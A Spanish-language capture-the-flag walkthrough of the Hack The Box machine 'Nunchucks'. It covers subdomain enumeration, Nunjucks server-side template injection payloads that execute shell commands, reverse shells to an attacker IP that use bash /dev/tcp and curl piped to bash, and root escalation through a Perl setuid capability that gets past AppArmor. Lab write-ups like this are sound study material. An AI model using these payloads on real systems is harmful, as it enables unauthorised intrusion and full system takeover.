## Summary

Tags: #Linux #HTTP #Capabilities #Perl #Nodejs #Nunjucks #Nginx #HTML #ReverShell #Gobuster #Dirbuster #SSTI #BurpSuite #SubDomains #Wfuzz #AppArmor #Nmap 

- IP -> 10.10.11.122
- Ports -> TCP (22, 80, 443), UDP (idk)
- OS ->  Linux
- Services & Applications
    - 22 -> 
    - 80 -> Nginx 1.18.0 Ubuntu 
    - 443 -> Nginx 1.18.0 Ubuntu 

## Launchpad

-  [Launchpad](https://launchpad.net/ubuntu)
-  [Nunjucks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)

## Recon

```bash 
❯ whatweb ❮http://❮IP❯      # Miramos las tecnologias 

# Agregamos el dominio que encontramos al '/etc/hosts'

❯ openssl s_client -connect ❮dominio.com❯:443   # Miramos los certificados en busqueda de otro dominio 
```

```bash
# Enumerar subdominios 

❯ gobuster vhost --append-domain -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --url https://nunchucks.com -t 200 -k 

	# append-domain = Enumerar los subdominios
	# vhost = Modo enumeracion VHost Subdominios
	# w = Ruta del diccionario
	# t = Lanzar tareas en paralelo al mismo tiempo
	# k = Para certificados autofirmados para el puerto 443


❯ wfuzz -c --hc=404 --hh=12345 -t 200 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H “Host: FUZZ.nunchucks.htb” https://nunchucks.htb

	# hc = HideCode 404
	# c = Formato colorido
	# hh = HideCharacters 12345
	# w = Ruta del diccionario
	# FUZZ = Donde va a insertar las palabras el diccionario
	# t = Lanzar tareas en paralelo al mismo tiempo
	# H = Para enumerar el subdominio, utilizamos esta cabecera 'Host: '

# Agregamos el subdominio encontrado en el '/etc/hosts'
```

```bash 
# Ingresamos a la nueva pagina y miramos que lo que colocamos en el input se refleja en la web. Probamos '{{7*7}}' y si nos devuelve un '49' entonces tendriamos un SSTI (Server Site Template Injection) 

# Buscamos esa vulnerabilidad en 'Hacktricks' para 'Nodejs-Nunjucks' y nos muestra los siguientes comandos a ingresar:

❯ {{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()}}
❯ {{range.constructor("return global.process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/10.10.14.11/6767 0>&1\"')")()}}

# Procedemos a hacerlo con 'Burpsuite' ya que en la web no nos hace valido el comando por la 'estructura'
```

```bash 
# En Burpsuite capturamos la peticion y colocamos el payload. A este payload le debemos de 'escapar' sus "" ya que la peticion se esta tramitando en 'Json' y entraria en conflicto con las "" que tiene ese formato.

❯ {{range.constructor(\"return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')\")()}}
```

## User

```bash 
# Como no hay 'PHP' debemos de hacer la Revershell a un archivo 'index.html' con el comando 'curl'

❯ {{range.constructor(\"return global.process.mainModule.require('child_process').execSync('curl http://10.10.14.26/index.html')\")()}}

# Una vez confirmado que hace la peticion a nuestra maquina de atacante, hacemos que lo interprete para obtener la 'revershell'
❯ {{range.constructor(\"return global.process.mainModule.require('child_process').execSync('curl http://10.10.14.26/index.html | bash')\")()}}
```

```bash 
# En nuestra maquina de atacante creamos el archivo que contendra la 'revershell'

❯ nano index.html
	#!/bin/bash
	bash -i >& /dev/tcp/10.10.14.2/443 0>&1

	# IP = IP de atacante
	# 443 = Puerto a usar

❯ curl ❮IP❯ | bash                     # Lo que hace Curl es obtener un index.html del servidor y despues con el bash haremos que nos interprete la data en bash
```

```bash 
❯ nc -nlvp 443          # Nos ponemos en escucha para recibir la revershell 
```

```bash
# Tratamiento de la consola 

❯ script /dev/null -c bash                               # Inicio del tratamiento de la consola 
❯ Ctrl + z
❯ stty raw -echo; fg
❯ reset xterm

# Despues cambiamos esto para poder hacer Ctrl+ l y Ctrl + c
❯ echo $SHELL                                            # Para ver la ruta de shell y ver que valor tiene **/usr/bin/nologin**
❯ export SHELL=bash o ❯ export SHELL=/bin/bash           # Hacemos que shell ahora valga bash
❯ export TERM=xterm                                      # Para poder hacer Ctrl +c y Ctrl + l (l=ele)

❯ export TERM=xterm-256color                             # Para que la shell tenga colores 
	❯ source /etc/skel/.bashrc

# Ahora para modificar las dimensiones de Vim/nano debemos hacer lo siguiente.
❯ stty size                                              # Miramos las dimensiones de la consola
❯ stty rows 51 columns 189   
```

```bash 
# Buscamos la primer flag 'user.txt' en el escritorio del usuario 
```

## Root

```bash 
# Buscar permisos SUID
❯ find / -perm -4000 2>/dev/null                  # Para ver que comandos son SUID, los buscamos desde la raiz 

# Buscar grupos especiales
❯ id 

# Buscar binarios con privilegios 
❯ sudo -l 

# Buscar capabilities en el sistema 
❯ getcap -r / 2>/dev/null                  # Listamos las capabilities que existan desde la raiz de forma recursiva y buscamos el comando aqui GTFOBins [GTFOBins]

Tipos de capabilities:
	# /usr/bin/perl cap_setuid+ep = Esta capabilitie nos permite gestionar el UID y hacer que opere como root
```

```bash 
# Encontramos en 'GTFobins' que podemos ejecutar el siguiente comando para ser 'root'
❯ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'

# Miramos que no pasa nada y que para algunos comandos no tenemos permiso de ejecucion. Por lo que investigamos en 'Google' alternativas de SeLinux y encontramos el 'AppArmor' el cual es un modulo de seguridad que permite al administrador del sistema restringir las capacidades de un programa. 

# Buscamos directorios que contengan el 'AppArmor'
❯ find / -name \*apparmor\* 2>/dev/null | grep -vE "proc|var|share"   # Buscar cualquier archivo desde la raiz que tenga algo antes y despues de 'apparmor'. 

# Encontramos la ruta la cual es: "/etc/apparmor.d" y entrantramos el archivo de conf 'usr.bin.perl' donde estan deshabiltados los comandos para obtener la 'bash'
```

```bash 
# Ahora buscamos en 'Google' 'Apparmor perl bugs', encontramos la web 'https://bugs.launchpad.net/apparmor/+bug/1911431', en esta web nos muestra como podemos ejecutar un script con el 'shebang' de perl como root.

# Nos dirigimos al dir '/tmp' ya que es el que tiene permisos de escritura y ahi creamos el 'script' que contenga el 'shebang' de perl 

❯ nano script.sh 
	#!/usr/bin/perl
	use POSIX qw(setuid); 
	POSIX::setuid(0); 
	exec "/bin/sh";

❯ chmod +x script.sh       # Le otorgamos permisos de ejecuciion 
❯ ./script.sh              # Ejecutamos y ahora somos root 
```